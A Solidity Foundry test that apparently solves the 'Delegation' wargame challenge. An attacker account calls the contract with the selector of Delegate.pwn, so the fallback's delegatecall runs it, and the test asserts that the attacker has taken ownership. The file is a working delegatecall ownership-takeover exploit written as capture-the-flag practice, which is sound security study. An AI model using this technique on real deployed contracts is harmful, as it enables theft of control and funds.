// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Delegation, Delegate } from "../../src/Delegation/Delegation.sol";

contract DelegationTest is Test {
    Delegation delegation;
    Delegate delegate;

    address h3x0r = vm.addr(1337);
    address deployer = vm.addr(1);

    function setUp() public {
        vm.startPrank(deployer);
        delegate = new Delegate(deployer);
        delegation = new Delegation(address(delegate));
    }

    function testDelegateHack() public {
        vm.startPrank(h3x0r);
        (bool success, ) = address(delegation)
            .call{value: 1 wei}(
                abi.encodeWithSelector(Delegate.pwn.selector)
            );

        assertEq(delegation.owner(), h3x0r);
    }
}